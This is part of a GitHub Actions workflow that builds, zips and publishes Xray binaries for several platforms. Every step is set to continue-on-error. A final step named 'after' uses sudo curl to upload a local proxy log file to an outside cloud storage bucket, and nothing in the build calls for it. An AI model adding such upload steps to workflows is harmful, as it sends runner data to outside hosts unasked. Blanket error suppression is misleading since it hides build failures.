    - continue-on-error: true
      name: Checkout codebase
      uses: actions/checkout@v4
    - continue-on-error: true
      name: Show workflow information
      run: 'export _NAME=$(jq ".[\"$GOOS-$GOARCH$GOARM$GOMIPS\"].friendlyName" -r
        < .github/build/friendly-filenames.json)

        echo "GOOS: $GOOS, GOARCH: $GOARCH, GOARM: $GOARM, GOMIPS: $GOMIPS, RELEASE_NAME:
        $_NAME"

        echo "ASSET_NAME=$_NAME" >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Set up Go
      uses: actions/setup-go@v5
      with:
        check-latest: true
        go-version: '1.21'
    - continue-on-error: true
      name: Get project dependencies
      run: go mod download
    - continue-on-error: true
      if: github.event_name != 'release'
      name: Replace Custom to Commit ID
      run: "ID=$(git rev-parse --short ${{ github.sha }})\nif [ \"${{ github.event_name\
        \ }}\" == 'pull_request' ]\nthen\n  ID=$(git rev-parse --short ${{ github.event.pull_request.head.sha\
        \ }})\nfi\nsed -i '/build/ s/Custom/'$ID'/' ./core/core.go\n"
    - continue-on-error: true
      name: Build Xray
      run: 'mkdir -p build_assets

        go build -v -o build_assets/xray -trimpath -ldflags "-s -w -buildid=" ./main

        '
    - continue-on-error: true
      if: matrix.goos == 'windows'
      name: Build background Xray on Windows
      run: 'go build -v -o build_assets/wxray.exe -trimpath -ldflags "-s -w -H windowsgui
        -buildid=" ./main

        '
    - continue-on-error: true
      if: matrix.goarch == 'mips' || matrix.goarch == 'mipsle'
      name: Build Mips softfloat Xray
      run: 'GOMIPS=softfloat go build -v -o build_assets/xray_softfloat -trimpath
        -ldflags "-s -w -buildid=" ./main

        '
    - continue-on-error: true
      if: matrix.goos == 'windows'
      name: Rename Windows Xray
      run: 'cd ./build_assets || exit 1

        mv xray xray.exe

        '
    - continue-on-error: true
      name: Restore Cache
      uses: actions/cache/restore@v3
      with:
        key: xray-geodat-
        path: resources
    - continue-on-error: true
      name: Copy README.md & LICENSE
      run: 'mv -f resources/* build_assets

        cp ${GITHUB_WORKSPACE}/README.md ./build_assets/README.md

        cp ${GITHUB_WORKSPACE}/LICENSE ./build_assets/LICENSE

        '
    - continue-on-error: true
      name: Create ZIP archive
      run: "pushd build_assets || exit 1\ntouch -mt $(date +%Y01010000) *\nzip -9vr\
        \ ../Xray-${{ env.ASSET_NAME }}.zip .\npopd || exit 1\nFILE=./Xray-${{ env.ASSET_NAME\
        \ }}.zip\nDGST=$FILE.dgst\nfor METHOD in {\"md5\",\"sha1\",\"sha256\",\"sha512\"\
        }\ndo\n  openssl dgst -$METHOD $FILE | sed 's/([^)]*)//g' >>$DGST\ndone\n"
      shell: bash
    - continue-on-error: true
      name: Change the name
      run: 'mv build_assets Xray-${{ env.ASSET_NAME }}

        '
    - continue-on-error: true
      name: Upload files to Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: Xray-${{ env.ASSET_NAME }}
        path: './Xray-${{ env.ASSET_NAME }}/*

          '
    - continue-on-error: true
      if: github.event_name == 'release'
      name: Upload binaries to release
      uses: svenstaro/upload-release-action@v2
      with:
        file: ./Xray-${{ env.ASSET_NAME }}.zip*
        file_glob: true
        repo_token: ${{ secrets.GITHUB_TOKEN }}
        tag: ${{ github.ref }}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Poundba/Xray-core.$(date
        +%s)
